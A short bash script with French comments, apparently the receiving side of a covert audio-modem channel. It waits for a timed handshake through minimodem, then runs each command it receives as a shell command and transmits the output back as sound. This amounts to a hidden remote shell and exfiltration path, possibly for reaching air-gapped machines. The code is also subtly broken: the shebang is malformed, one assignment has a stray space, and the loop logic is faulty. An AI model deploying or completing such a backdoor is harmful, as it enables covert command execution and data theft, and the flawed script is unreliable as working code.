#/bin/bash
clear
minute=$(date +%M)
let "fenetre_de_tire=$minute % 4"

# Définie la fenetre de tire durant laquelle la machine distante est en ecoute
while [ $fenetre_de_tire -ge 2 ] ; do
sleep 2
minute=$(date +%M)
let "fenetre_de_tire=10#$minute % 4"
echo $fenetre_de_tire
done

# Début de syncro
# echo "début"
gtimeout 120 minimodem --rx 20 > temp.txt
if [ $(grep -c "SYN" temp.txt) != 0 ]; then
sleep 10
echo "ACK" | minimodem --tx 20
# echo "ACK"
elif [ "$SYN" == "END" ]; then
exit
else
rm temp.txt
bash "cible.sh"
exit
fi

# Début de l'envoie
sleep 100
gtimeout 120 minimodem --rx 20 > temp.txt
head -n 3 temp.txt | tail -n 1 > commande.txt
sleep 2
cmd=$(<commande.txt)
$cmd | minimodem --tx 100

sleep 2
while [ $(grep -c "END" commande.txt) != 0 ]; do
gtimeout 120 minimodem --rx 20 > temp.txt
cmd =$(<commande.txt)
$cmd | minimodem --tx 100
rm temp.txt
rm commande.txt
while [ $fenetre_de_tire -ge 2 ] ; do
sleep 2
minute=$(date +%M)
let "fenetre_de_tire=10#$minute % 4"
echo $fenetre_de_tire
done
done
